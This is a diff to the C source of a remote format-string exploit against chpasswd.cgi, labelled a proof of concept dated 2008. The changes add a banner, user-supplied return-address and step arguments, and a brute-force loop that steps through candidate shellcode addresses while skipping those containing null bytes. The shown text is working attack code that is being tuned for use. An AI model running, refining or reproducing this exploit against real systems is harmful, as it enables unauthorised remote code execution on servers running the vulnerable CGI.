@@ -216,14 +216,21 @@ main (int argc, char ** argv)
 	
 	int found;
 
-	unsigned int expect_shellcode_addr = 0xbeefbeef;
+	unsigned int expect_shellcode_addr = 0xbfffffff;
+	int step = -128;
+
 	int shellcode_addr_found;
 
 	int total_shellcode_addr_retries;
 
+	
+	puts ("Proof of concept chpasswd.cgi remote format string exploit");
+	puts ("by skylazart/dm_ - BufferOverflow & xored");
+	puts ("28/11/2008");
+	puts ("");
 
 	if (argc < 2) {
-		printf ("%s <host> [port] [cgi_path]\n", argv[0]);
+		printf ("%s <host> [port] [cgi_path] [return address] [step]\n", argv[0]);
 		exit (1);
 	}
 
@@ -232,8 +239,16 @@ main (int argc, char ** argv)
 		port = atoi (argv[2]);
 	}
 
-	if (argc == 4) {
+	if (argc >= 4) {
 		cgi_path = argv[3];
+	}
+
+	if (argc >= 5) { 
+		expect_shellcode_addr = strtoul (argv[4], NULL, 16);
+	}
+
+	if (argc >= 6) {
+		step = atoi (argv[5]);
 	}
 
 	if (port == 0) {
@@ -314,12 +329,14 @@ main (int argc, char ** argv)
 	}
        	
 
-	expect_shellcode_addr = 0xbf9f7601;
-	//expect_shellcode_addr = 0xbfa08301;
+//	expect_shellcode_addr = 0xbf9f7601;
+//	expect_shellcode_addr = 0xbfa08301;
+//	expect_shellcode_addr = 0xbff0f7fc & 0xffff0000;
+//	expect_shellcode_addr = 0xbfbafdd5 & 0xffff0000;
+//	expect_shellcode_addr = 0xb7fc5d68 & 0xffff0000;
+//
+//	expect_shellcode_addr = 0xbfffffff;
 
-	expect_shellcode_addr = 0xbffff7fc & 0xffff0000;
-	if ((expect_shellcode_addr & 0x000000ff) == 0)
-		expect_shellcode_addr++;
 
 	shellcode_addr_found = 0;
 	total_shellcode_addr_retries = 0;
@@ -330,8 +347,7 @@ main (int argc, char ** argv)
 		    (expect_shellcode_addr & 0x00ff0000) >>16 == 0 ||
 		    (expect_shellcode_addr & 0x0000ff00) >> 8 == 0 ||
 		    (expect_shellcode_addr & 0x000000FF)      == 0) {
-			//printf (">> Skipping address 0x%08x\n", expect_shellcode_addr);
-
+			printf (">> Skipping address 0x%08x\n", expect_shellcode_addr);
 			expect_shellcode_addr++;
 			continue;
 		}
@@ -368,7 +384,7 @@ main (int argc, char ** argv)
 			}
 		}
 		
-		expect_shellcode_addr += 128;
+		expect_shellcode_addr = expect_shellcode_addr + step;
 	} while (!found);
 		 
 	
